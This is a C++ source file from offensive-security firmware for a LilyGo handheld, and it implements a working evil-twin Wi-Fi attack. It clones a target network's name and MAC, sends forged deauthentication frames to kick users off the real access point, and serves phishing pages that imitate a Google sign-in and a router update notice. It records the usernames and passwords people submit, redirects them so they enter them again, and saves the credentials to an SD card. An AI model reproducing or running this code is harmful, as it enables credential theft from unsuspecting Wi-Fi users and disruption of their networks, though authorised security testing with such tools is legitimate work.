// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Portions derived from Bruce firmware (https://github.com/pr3y/Bruce)
// Original: evil_portal.cpp/.h — captive portal logic + HTML templates
// Adapted for T-REX: synchronous WebServer, MAC spoofing, inline deauth,
// T-REX display/keyboard/SD systems.
// Bruce is licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
// Modifications are licensed under AGPL-3.0-or-later.

#include "eviltwin.h"
#include "input_handling.h"
#include "clock_manager.h"
#include "lockscreen_manager.h"
#include "wifi_sd_guard.h"
#include <WiFi.h>
#include <SD.h>

extern InputHandling inputHandler;

// Accurate client count via AP events — softAPgetStationNum() counts OS-level
// associations which includes brief probe/auth attempts and inflates the number.
static volatile int s_etClients = 0;

static const IPAddress AP_IP(192, 168, 4, 1);
static const IPAddress AP_GW(192, 168, 4, 1);
static const IPAddress AP_NM(255, 255, 255, 0);

static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ── HTML templates — adapted from Bruce firmware ──────────────────────────────
// Source: https://github.com/pr3y/Bruce (evil_portal.cpp)

static const char HTML_GOOGLE[] = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
body{font-family:Roboto,arial,sans-serif;background:#fff;margin:0}
.c{max-width:450px;margin:80px auto;padding:40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:24px}
input{width:100%;box-sizing:border-box;padding:14px;margin:8px 0 20px;
  border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
input:focus{border-color:#1a73e8}
.btn{background:#1a73e8;color:#fff;border:none;padding:14px 24px;
  border-radius:4px;font-size:14px;cursor:pointer;float:right}
.btn:hover{background:#1557b0}
.foot{margin-top:16px;font-size:12px;color:#5f6368;text-align:center}
.logo{text-align:center;margin-bottom:24px;font-size:32px;font-weight:300;letter-spacing:-1px}
</style></head><body>
<div class="c">
  <div class="logo">
    <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span>
    <span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span>
    <span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
  </div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form method="POST" action="/post">
    <input type="email" name="user" placeholder="Email or phone" required>
    <input type="password" name="pass" placeholder="Enter your password" required>
    <div style="overflow:hidden">
      <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Forgot password?</a>
      <button type="submit" class="btn">Next</button>
    </div>
  </form>
  <p class="foot">Not your computer? Use Guest mode to sign in privately.</p>
</div></body></html>)rawliteral";

static const char HTML_ROUTER[] = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Firmware Update</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0}
.box{max-width:480px;margin:60px auto;background:#fff;border-radius:8px;
  padding:32px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
h2{color:#cc0000;margin-top:0;font-size:22px}
.warn{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;
  padding:12px;margin-bottom:20px;font-size:14px;color:#856404}
label{display:block;margin-bottom:4px;font-size:14px;font-weight:bold;color:#333}
input{width:100%;box-sizing:border-box;padding:10px;margin-bottom:16px;
  border:1px solid #ccc;border-radius:4px;font-size:15px}
.btn{background:#cc0000;color:#fff;border:none;padding:12px 32px;
  border-radius:4px;font-size:15px;cursor:pointer;width:100%}
.btn:hover{background:#990000}
.foot{text-align:center;margin-top:16px;font-size:12px;color:#888}
</style></head><body>
<div class="box">
  <h2>&#9888; Security Update Required</h2>
  <div class="warn">
    <b>Notice:</b> Your router requires a critical firmware update to patch
    a security vulnerability. Please verify your admin credentials to continue.
  </div>
  <form method="POST" action="/post">
    <label>Admin Username</label>
    <input type="text" name="user" placeholder="admin" required>
    <label>Admin Password</label>
    <input type="password" name="pass" placeholder="Enter password" required>
    <button type="submit" class="btn">Verify &amp; Update</button>
  </form>
  <p class="foot">Router Management Portal &bull; Firmware v3.1.2</p>
</div></body></html>)rawliteral";

// ── Constructor ───────────────────────────────────────────────────────────────

EvilTwin::EvilTwin(DisplayManager& dm, SDCardManager& sd)
    : dm(dm), sd(sd), server(80),
      _tmpl(0), _captureCount(0), _savedCount(0), _dirty(true),
      _isClone(false), _targetIsOpen(false), _targetChannel(1),
      _deauthEnabled(false), _deauthLastMs(0), _deauthCount(0),
      _useCustomTemplate(false),
      _uiNoticeMs(0), _uiNoticeColor(TFT_GREEN)
{
    _ssid[0]            = '\0';
    _lastUser[0]        = '\0';
    _lastPass[0]        = '\0';
    _sdTemplatePath[0]  = '\0';
    _sdTemplateName[0]  = '\0';
    _uiNoticeText[0]    = '\0';
    memset(_targetBSSID, 0, 6);
    memset(_fakeMAC,     0, 6);
}

// ── Entry point ───────────────────────────────────────────────────────────────

void EvilTwin::start(const char* ssid) {
    _captureCount       = 0;
    _savedCount         = 0;
    _lastUser[0]        = '\0';
    _lastPass[0]        = '\0';
    memset(_creds, 0, sizeof(_creds));
    _tmpl               = 0;
    _dirty              = true;
    _isClone            = false;
    _targetIsOpen       = false;
    _deauthEnabled      = false;
    _deauthLastMs       = 0;
    _deauthCount        = 0;
    _targetChannel      = 1;
    _useCustomTemplate  = false;
    _sdTemplatePath[0]  = '\0';
    _sdTemplateName[0]  = '\0';
    _uiNoticeMs         = 0;
    _uiNoticeText[0]    = '\0';
    memset(_targetBSSID, 0, 6);
    memset(_fakeMAC,     0, 6);

    if (ssid && *ssid) {
        // SSID provided as argument → skip menu, custom mode
        strncpy(_ssid, ssid, 32);
        _ssid[32] = '\0';
    } else {
        int mode = showModeMenu();
        if (mode < 0) { dm.printCommandScreen(); return; }

        bool ok = (mode == 0) ? doScanAndPick() : promptCustomSSID();
        if (!ok) { dm.printCommandScreen(); return; }
    }

    // ── Start soft-AP ─────────────────────────────────────────────────────────
    WiFi.disconnect(false);
    delay(100);
    WiFi.mode(WIFI_AP);

    if (_isClone) {
        if (_targetIsOpen) {
            // Open network: clone MAC exactly — clients reconnect with no security mismatch
            memcpy(_fakeMAC, _targetBSSID, 6);
        } else {
            // Secured network: use a random locally-administered MAC for our fake AP.
            // Deauth frames still carry the real AP's BSSID as SA, so they only kick
            // clients off the real AP and never touch our own connected clients.
            for (int i = 0; i < 6; i++) _fakeMAC[i] = (uint8_t)(esp_random() & 0xFF);
            _fakeMAC[0] = (_fakeMAC[0] & 0xFE) | 0x02; // unicast, locally administered
        }
        esp_wifi_set_mac(WIFI_IF_AP, _fakeMAC);
    }

    WiFi.softAPConfig(AP_IP, AP_GW, AP_NM);
    WiFi.softAP(_ssid, nullptr, _targetChannel);
    delay(200);

    if (_deauthEnabled) {
        // Promiscuous mode required for raw 802.11 TX injection
        esp_wifi_set_promiscuous(true);
    }

    // Track connected clients via events — accurate unlike softAPgetStationNum()
    s_etClients = 0;
    _evConn = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t) { s_etClients++; },
                            ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    _evDisc = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t) { if (s_etClients > 0) s_etClients--; },
                            ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);

    // ── DNS + HTTP ────────────────────────────────────────────────────────────
    dns.start(53, "*", AP_IP);
    setupRoutes();
    server.begin();

    drawScreen();
    uint32_t lastDraw = millis();

    // ── Main loop ─────────────────────────────────────────────────────────────
    while (true) {
        dns.processNextRequest();
        server.handleClient();

        // Adaptive deauth: only fire when nobody is on the fake AP.
        // Pauses automatically the moment a client connects so they can
        // complete the form uninterrupted. Resumes when they leave.
        if (_deauthEnabled && s_etClients == 0 &&
            millis() - _deauthLastMs >= 8000) {
            sendDeauthBurst();
            _deauthLastMs = millis();
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            _dirty = true;
        }

        if (_dirty || millis() - lastDraw >= 2000) {
            drawScreen();
            lastDraw = millis();
            _dirty   = false;
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'p' || k == 'P') {
            server.stop(); dns.stop();
            pickTemplate();
            setupRoutes(); server.begin();
            dns.start(53, "*", AP_IP);
            _dirty = true;   // always repaint status screen after the picker
        }
        if (k == 'c' || k == 'C') {
            showCredsTable();
            drawScreen(); lastDraw = millis(); _dirty = false;
        }
        if (k == 's' || k == 'S') {
            // Creds live in RAM during capture (GDMA-safe); [s] checkpoints to SD.
            if (!sd.isReady()) {
                _uiNoticeColor = TFT_RED;
                strcpy(_uiNoticeText, "SD not ready");
            } else if (_captureCount == 0) {
                _uiNoticeColor = TFT_YELLOW;
                strcpy(_uiNoticeText, "No creds to save");
            } else {
                int n = flushCredsToSD(false);   // false → pause promiscuous around write
                _uiNoticeColor = TFT_GREEN;
                if (n > 0) snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Saved %d new to SD", n);
                else       strcpy(_uiNoticeText, "Already saved");
            }
            _uiNoticeMs = millis();
            _dirty = true;
        }
    }

    // ── Teardown ──────────────────────────────────────────────────────────────
    WiFi.removeEvent(_evConn);
    WiFi.removeEvent(_evDisc);
    server.stop();
    dns.stop();
    if (_deauthEnabled) esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    delay(100);

    // SD is now fully GDMA-safe (AP down, promiscuous off, WiFi idle) — persist
    // any creds captured but not yet flushed via [s].
    flushCredsToSD(true);

    dm.printCommandScreen();
}

// ── Setup UI ──────────────────────────────────────────────────────────────────

int EvilTwin::showModeMenu() {
    dm.clearScreen();
    dm.setDefaultTextSize();

    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_RED);
    dm.println("EVIL TWIN SETUP");

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_YELLOW);
    dm.println("[1] Clone existing AP");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("    Spoof MAC + channel, optional deauth");

    dm.setCursor(4, dm.getCursorY());
    dm.println("");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_YELLOW);
    dm.println("[2] Custom SSID");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("    Type your own network name");

    dm.setCursor(4, dm.getCursorY());
    dm.println("");
    dm.setCursor(4, dm.getCursorY());
    dm.println("[q] cancel");

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == '1') return 0;
        if (k == '2') return 1;
        if (k == 'q' || k == 'Q') return -1;
    }
}

bool EvilTwin::doScanAndPick() {
    dm.clearScreen();
    dm.setDefaultTextSize();
    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_CYAN);
    dm.println("Scanning WiFi...");

    WiFi.mode(WIFI_STA);
    delay(100);
    int n = WiFi.scanNetworks(false, true); // blocking, show hidden

    if (n <= 0) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_RED);
        dm.println("No networks found.");
        delay(2000);
        WiFi.scanDelete();
        return false;
    }

    int page     = 0;
    int pages    = (n + ET_PER_PAGE - 1) / ET_PER_PAGE;
    bool redraw  = true;

    while (true) {
        if (redraw) { drawScanList(n, page); redraw = false; }

        char k = inputHandler.getKeyboardInput();
        if (!k) { delay(20); continue; }

        if (k == 'q' || k == 'Q')               { WiFi.scanDelete(); return false; }
        if ((k == 'n' || k == 'N') && page < pages - 1) { page++; redraw = true; continue; }
        if ((k == 'p' || k == 'P') && page > 0)         { page--; redraw = true; continue; }

        if (k >= '1' && k <= '0' + ET_PER_PAGE) {
            int idx = page * ET_PER_PAGE + (k - '1');
            if (idx < n) {
                strncpy(_ssid, WiFi.SSID(idx).c_str(), 32);
                _ssid[32]      = '\0';
                memcpy(_targetBSSID, WiFi.BSSID(idx), 6);
                _targetChannel = WiFi.channel(idx);
                _targetIsOpen  = (WiFi.encryptionType(idx) == WIFI_AUTH_OPEN);
                _isClone       = true;
                WiFi.scanDelete();
                return askDeauth();
            }
        }
    }
}

void EvilTwin::drawScanList(int total, int page) {
    dm.clearScreen();
    dm.setDefaultTextSize();

    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_CYAN);
    dm.println("Clone — pick network:");

    int start = page * ET_PER_PAGE;
    int end   = min(start + ET_PER_PAGE, total);

    for (int i = start; i < end; i++) {
        bool isOpen = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(isOpen ? TFT_GREEN : TFT_WHITE);
        char buf[48];
        snprintf(buf, sizeof(buf), "[%d] %-15.15s %s ch%d",
                 i - start + 1,
                 WiFi.SSID(i).c_str(),
                 isOpen ? "OPEN" : "WPA ",
                 WiFi.channel(i));
        dm.println(buf);
    }

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    char nav[40];
    snprintf(nav, sizeof(nav), "[n]ext [p]rev [q]uit  pg %d/%d",
             page + 1, (total + ET_PER_PAGE - 1) / ET_PER_PAGE);
    dm.println(nav);
}

bool EvilTwin::promptCustomSSID() {
    char buf[33] = {};
    int  len     = 0;

    dm.clearScreen();
    dm.setDefaultTextSize();
    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_CYAN);
    dm.println("Custom SSID:");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("[Enter]=confirm  [q]=cancel (empty)");

    int32_t inputY = dm.getCursorY() + 4;

    auto redraw = [&]() {
        dm.fillRect(4, inputY, 312, LINE_HEIGHT + 2, TFT_BLACK);
        dm.setCursor(4, inputY);
        dm.setTextColor(TFT_WHITE);
        char line[40];
        snprintf(line, sizeof(line), "> %s_", buf);
        dm.println(line);
    };
    redraw();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (!k) { delay(20); continue; }

        if (k == '\r' || k == '\n') {
            if (len > 0) {
                strncpy(_ssid, buf, 32);
                _ssid[32]      = '\0';
                _deauthEnabled = false;
                return true;
            }
        } else if (k == '\b') {
            if (len > 0) { buf[--len] = '\0'; redraw(); }
        } else if (k == 'q' && len == 0) {
            return false;
        } else if (isPrintable(k) && len < 32) {
            buf[len++] = k;
            buf[len]   = '\0';
            redraw();
        }
    }
}

bool EvilTwin::askDeauth() {
    dm.clearScreen();
    dm.setDefaultTextSize();

    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_YELLOW);
    dm.println("Cloning network:");

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_WHITE);
    char buf[52];
    snprintf(buf, sizeof(buf), "SSID: %.32s", _ssid);
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    snprintf(buf, sizeof(buf), "MAC : %02X:%02X:%02X:%02X:%02X:%02X",
             _targetBSSID[0], _targetBSSID[1], _targetBSSID[2],
             _targetBSSID[3], _targetBSSID[4], _targetBSSID[5]);
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    snprintf(buf, sizeof(buf), "Ch  : %d   Sec: %s",
             _targetChannel, _targetIsOpen ? "OPEN" : "WPA2");
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(_targetIsOpen ? TFT_GREEN : TFT_YELLOW);
    if (_targetIsOpen) {
        dm.println("Open: clone MAC — seamless reconnect");
    } else {
        dm.println("WPA2: random MAC — open fake AP");
        dm.setCursor(4, dm.getCursorY());
        dm.println("Tip: use a portal page asking for WiFi password");
    }

    dm.setCursor(4, dm.getCursorY());
    dm.println("");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_RED);
    dm.println("[y] Deauth real AP  (kick clients)");
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("[n] Just spoof MAC+SSID");
    dm.setCursor(4, dm.getCursorY());
    dm.println("[q] Cancel");

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'y' || k == 'Y') { _deauthEnabled = true;  return true; }
        if (k == 'n' || k == 'N') { _deauthEnabled = false; return true; }
        if (k == 'q' || k == 'Q') return false;
    }
}

// ── Portal routes ─────────────────────────────────────────────────────────────

void EvilTwin::setupRoutes() {
    server.on("/", HTTP_GET, [this]() { handleRoot(); });

    // Credential submission endpoints. Portals vary wildly:
    //  - built-in templates POST to /post  (fields user/pass)
    //  - Bruce-style SD portals GET/POST to /get  (fields email/password, uname/psw…)
    // Register BOTH paths for BOTH verbs and let captureArgs() figure out the
    // field names, so any of the /apps/eviltwin/portal/*.html pages capture.
    server.on("/post", HTTP_ANY, [this]() { handleCapture(); });
    server.on("/get",  HTTP_ANY, [this]() { handleCapture(); });

    auto redir = [this]() { handleRedirect(); };

    // Android (all versions)
    server.on("/generate_204",                          HTTP_GET, redir);
    server.on("/gen_204",                               HTTP_GET, redir);
    server.on("/connectivity-check.html",               HTTP_GET, redir);
    server.on("/check_network_status.php",              HTTP_GET, redir);

    // iOS / macOS
    server.on("/hotspot-detect.html",                   HTTP_GET, redir);
    server.on("/library/test/success.html",             HTTP_GET, redir);
    server.on("/success.html",                          HTTP_GET, redir);

    // Windows
    server.on("/ncsi.txt",                              HTTP_GET, redir);
    server.on("/connecttest.txt",                       HTTP_GET, redir);
    server.on("/redirect",                              HTTP_GET, redir);

    // Firefox / Linux
    server.on("/canonical.html",                        HTTP_GET, redir);
    server.on("/success.txt",                           HTTP_GET, redir);
    server.on("/detected.html",                         HTTP_GET, redir);

    // catch-all: some portals submit to an unexpected path — try to capture
    // creds from the args first, then redirect. (OS probe hits carry no form
    // args, so captureArgs() is a harmless no-op for them.)
    server.onNotFound([this]() { handleCapture(); });
}

void EvilTwin::handleRoot() {
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");

    if (_useCustomTemplate && sd.isReady()) {
        File f = SD.open(_sdTemplatePath);
        if (f) {
            String html = f.readString();
            f.close();
            server.send(200, "text/html", html);
            return;
        }
        // file gone — fall through to built-in
        _useCustomTemplate = false;
        _uiNoticeMs    = millis();
        _uiNoticeColor = TFT_RED;
        snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Portal file missing — fell back");
        _dirty = true;
    }
    server.send(200, "text/html", _tmpl == 0 ? HTML_GOOGLE : HTML_ROUTER);
}

// ── Field-name classification ─────────────────────────────────────────────────
// Portals don't agree on input names. Classify by substring (case-insensitive)
// so we capture whatever the page happens to call its username/password fields.
static inline bool etNameHas(const String& ln, const char* kw) { return ln.indexOf(kw) >= 0; }

static bool etIsPassField(const String& ln) {
    return etNameHas(ln, "pass") || etNameHas(ln, "pwd") || etNameHas(ln, "psw") ||
           etNameHas(ln, "passcode") || ln == "pin";
}
static bool etIsUserField(const String& ln) {
    return etNameHas(ln, "email") || etNameHas(ln, "user") || etNameHas(ln, "login") ||
           etNameHas(ln, "uname") || etNameHas(ln, "account") || etNameHas(ln, "phone") ||
           etNameHas(ln, "mobile") || etNameHas(ln, "identifier") || etNameHas(ln, "ident") ||
           ln == "id" || ln == "name" || ln == "tel";
}
// Non-credential fields that must never be mistaken for a username in the fallback.
static bool etIsIgnoreField(const String& ln) {
    return etNameHas(ln, "remember") || etNameHas(ln, "token") || etNameHas(ln, "csrf") ||
           etNameHas(ln, "captcha")  || etNameHas(ln, "submit") || etNameHas(ln, "button") ||
           etNameHas(ln, "viewport") || etNameHas(ln, "layer")  || etNameHas(ln, "hidden");
}

bool EvilTwin::captureArgs() {
    String user, pass;
    int n = server.args();
    for (int i = 0; i < n; i++) {
        String nm = server.argName(i);
        if (nm == "plain") continue;          // raw POST body, not a named field
        String val = server.arg(i);
        if (val.length() == 0) continue;
        String ln = nm; ln.toLowerCase();
        if      (pass.length() == 0 && etIsPassField(ln)) pass = val;
        else if (user.length() == 0 && etIsUserField(ln)) user = val;
    }

    // Fallback: recognized a password but the username field had an odd name —
    // take the first non-empty field that isn't the password or junk.
    if (pass.length() > 0 && user.length() == 0) {
        for (int i = 0; i < n; i++) {
            String nm = server.argName(i);
            if (nm == "plain") continue;
            String val = server.arg(i);
            if (val.length() == 0) continue;
            String ln = nm; ln.toLowerCase();
            if (etIsPassField(ln) || etIsIgnoreField(ln)) continue;
            user = val; break;
        }
    }

    if (user.length() == 0 && pass.length() == 0) return false;   // nothing useful

    strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
    strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
    // RAM-only capture — NO SD write here. Writing to SD while the soft-AP /
    // promiscuous (deauth) DMA is live risks FatFS corruption (GDMA rule), and
    // the victim submitting the form is the worst moment to lose data. Creds are
    // flushed to SD on [s] (promiscuous paused) and on exit.
    if (_captureCount < ET_MAX_CREDS) {
        CapturedCred& c = _creds[_captureCount];
        strncpy(c.user, user.c_str(), 47); c.user[47] = '\0';
        strncpy(c.pass, pass.c_str(), 47); c.pass[47] = '\0';
        c.ts[0] = '\0';
        ClockManager::instance().getTimestamp(c.ts, sizeof(c.ts));
    }
    _captureCount++;
    _dirty = true;
    return true;
}

void EvilTwin::handleCapture() {
    captureArgs();
    // Always bounce back to the portal root — a reload looks like a failed login,
    // so the victim re-enters (and we capture again). Reuses the proven redirect.
    handleRedirect();
}

void EvilTwin::handleRedirect() {
    server.sendHeader("Location", "http://192.168.4.1/");
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");
    server.send(302, "text/html",
        "<html><head>"
        "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>"
        "</head><body>"
        "<a href='http://192.168.4.1/'>Open portal</a>"
        "</body></html>");
}

// ── Deauth frame injection ────────────────────────────────────────────────────

void EvilTwin::sendDeauthBurst() {
    uint8_t frame[26];
    // Frame control: deauth (0xC0), then disassoc (0xA0)
    // DA=broadcast, SA=real AP MAC, BSSID=real AP MAC
    // Clients receiving this believe the real AP is telling them to leave.
    for (uint8_t type : {(uint8_t)0xC0, (uint8_t)0xA0}) {
        frame[0] = type; frame[1] = 0x00;
        frame[2] = 0x3a; frame[3] = 0x01;
        memcpy(frame + 4,  BCAST,        6); // DA = broadcast
        memcpy(frame + 10, _targetBSSID, 6); // SA = real AP
        memcpy(frame + 16, _targetBSSID, 6); // BSSID = real AP
        frame[22] = 0x00; frame[23] = 0x00;
        frame[24] = 0x07; frame[25] = 0x00; // reason 7
        for (int i = 0; i < 15; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
            delay(1);
        }
    }
    _deauthCount++;
}

// ── Display ───────────────────────────────────────────────────────────────────

void EvilTwin::drawScreen() {
    dm.clearScreen();
    dm.setDefaultTextSize();

    dm.setCursor(4, outputY);
    dm.setTextColor(TFT_RED);
    dm.println("EVIL TWIN AP");

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_WHITE);
    char buf[52];
    snprintf(buf, sizeof(buf), "SSID : %.32s", _ssid);
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    if (_isClone) {
        if (_targetIsOpen) {
            snprintf(buf, sizeof(buf), "MAC : %02X:%02X:%02X:%02X:%02X:%02X clone",
                     _fakeMAC[0], _fakeMAC[1], _fakeMAC[2],
                     _fakeMAC[3], _fakeMAC[4], _fakeMAC[5]);
        } else {
            snprintf(buf, sizeof(buf), "MAC : %02X:%02X:%02X:%02X:%02X:%02X rnd",
                     _fakeMAC[0], _fakeMAC[1], _fakeMAC[2],
                     _fakeMAC[3], _fakeMAC[4], _fakeMAC[5]);
        }
    } else {
        strcpy(buf, "IP  : 192.168.4.1");
    }
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    if (_useCustomTemplate) {
        snprintf(buf, sizeof(buf), "Chan : %d   Page: %.20s", _targetChannel, _sdTemplateName);
    } else {
        snprintf(buf, sizeof(buf), "Chan : %d   Page: %s",
                 _targetChannel, _tmpl == 0 ? "Google" : "Router");
    }
    dm.println(buf);

    // transient confirmation when the active portal page changes (or falls back)
    if (_uiNoticeMs && millis() - _uiNoticeMs < 1500) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(_uiNoticeColor);
        dm.println(_uiNoticeText);
    }

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(TFT_YELLOW);
    snprintf(buf, sizeof(buf), "Clients  : %d", (int)s_etClients);
    dm.println(buf);

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(_captureCount > 0 ? TFT_GREEN : TFT_YELLOW);
    snprintf(buf, sizeof(buf), "Captured : %d", _captureCount);
    dm.println(buf);

    if (_captureCount > 0) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_GREEN);
        snprintf(buf, sizeof(buf), "User : %.30s", _lastUser);
        dm.println(buf);
        dm.setCursor(4, dm.getCursorY());
        snprintf(buf, sizeof(buf), "Pass : %.30s", _lastPass);
        dm.println(buf);
    }

    if (_deauthEnabled) {
        dm.setCursor(4, dm.getCursorY());
        bool clientPresent = s_etClients > 0;
        if (clientPresent) {
            dm.setTextColor(TFT_GREEN);
            snprintf(buf, sizeof(buf), "Deauth: PAUSED — client on portal");
        } else {
            dm.setTextColor(TFT_RED);
            uint32_t elapsed   = millis() - _deauthLastMs;
            uint32_t nextInSec = elapsed >= 8000 ? 0 : (8000 - elapsed) / 1000;
            snprintf(buf, sizeof(buf), "Deauth: %d bursts  next:%lus",
                     _deauthCount, (unsigned long)nextInSec);
        }
        dm.println(buf);
    }

    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("[q]quit [p]portal [c]creds [s]save");
}

// ── Credentials table ─────────────────────────────────────────────────────────

void EvilTwin::showCredsTable() {
    dm.clearScreen();
    dm.setDefaultTextSize();
    dm.setCursor(4, outputY);

    if (_captureCount == 0) {
        dm.setTextColor(TFT_YELLOW);
        dm.println("No credentials captured yet.");
        delay(1500);
        return;
    }

    int total  = min(_captureCount, ET_MAX_CREDS);
    int pages  = (total + ET_CREDS_PER_PAGE - 1) / ET_CREDS_PER_PAGE;
    int page   = 0;
    bool redraw = true;

    while (true) {
        if (redraw) {
            dm.clearScreen();
            dm.setDefaultTextSize();

            dm.setCursor(4, outputY);
            dm.setTextColor(TFT_GREEN);
            char hdr[40];
            snprintf(hdr, sizeof(hdr), "Creds: %d total  (pg %d/%d)", _captureCount, page + 1, pages);
            dm.println(hdr);
            int sepY = dm.getCursorY();
            dm.fillRect(4, sepY, 312, 1, TFT_DARKGREY);
            dm.setCursor(4, sepY + 3);

            int start = page * ET_CREDS_PER_PAGE;
            int end   = min(start + ET_CREDS_PER_PAGE, total);
            for (int i = start; i < end; i++) {
                char buf[52];
                dm.setCursor(4, dm.getCursorY() + 2);
                dm.setTextColor(TFT_CYAN);
                snprintf(buf, sizeof(buf), "#%d", i + 1);
                dm.printText(buf);
                dm.setTextColor(0x7BEF);
                snprintf(buf, sizeof(buf), " %.38s", _creds[i].user);
                dm.println(buf);
                dm.setCursor(12, dm.getCursorY());
                dm.setTextColor(TFT_WHITE);
                snprintf(buf, sizeof(buf), "%.44s", _creds[i].pass);
                dm.println(buf);
            }

            if (_captureCount > ET_MAX_CREDS) {
                dm.setCursor(4, dm.getCursorY());
                dm.setTextColor(TFT_RED);
                char warn[44];
                snprintf(warn, sizeof(warn), "+%d dropped (buffer full, max %d)",
                         _captureCount - ET_MAX_CREDS, ET_MAX_CREDS);
                dm.println(warn);
            }

            dm.setCursor(4, dm.getCursorY() + 2);
            dm.setTextColor(0x7BEF);
            dm.println("[a]prev [l]next [q]back");
            redraw = false;
        }

        // Keep the captive portal responsive while the operator views creds.
        dns.processNextRequest();
        server.handleClient();

        char k = inputHandler.getKeyboardInput();
        if (!k) { delay(2); continue; }
        if (k == 'q' || k == 'Q') break;
        if ((k == 'l' || k == 'L') && page < pages - 1) { page++; redraw = true; }
        if ((k == 'a' || k == 'A') && page > 0)         { page--; redraw = true; }
    }
}

int EvilTwin::flushCredsToSD(bool /*wifiSafe*/) {
    if (!sd.isReady() || _captureCount == 0) return 0;

    int total = min(_captureCount, ET_MAX_CREDS);
    if (_savedCount >= total) return 0;   // nothing new since last flush

    // GDMA: pause promiscuous (if live) around the SD write, restore after.
    // Self-correcting — on the exit path promiscuous is already off, so this is
    // a no-op. (The old wifiSafe arg is now redundant; kept for call sites.)
    ScopedPromiscPause _gdma;

    sd.ensureDir(ET_DIR_PATH);
    int written = 0;
    for (int i = _savedCount; i < total; i++) {
        String row = _creds[i].ts[0]
            ? (String(_creds[i].ts) + "," + _creds[i].user + "," + _creds[i].pass)
            : (String(_creds[i].user) + "," + _creds[i].pass);
        sd.appendLine(ET_LOG_PATH, row);
        written++;
    }
    _savedCount = total;

    return written;
}

// ── Portal template picker (built-in + SD) ───────────────────────────────────

bool EvilTwin::pickTemplate() {
    // Collect all .html / .htm filenames from SD (if available)
    char names[ET_TEMPLATE_MAX][48] = {};
    int  sdCount = 0;
    if (sd.isReady()) {
        File dir = SD.open(ET_PORTAL_DIR);
        if (dir && dir.isDirectory()) {
            while (sdCount < ET_TEMPLATE_MAX) {
                File f = dir.openNextFile();
                if (!f) break;
                if (!f.isDirectory()) {
                    String nm = String(f.name());
                    String nml = nm; nml.toLowerCase();
                    if (nml.endsWith(".html") || nml.endsWith(".htm")) {
                        strncpy(names[sdCount], nm.c_str(), 47);
                        names[sdCount][47] = '\0';
                        sdCount++;
                    }
                }
                f.close();
            }
        }
        if (dir) dir.close();
    }

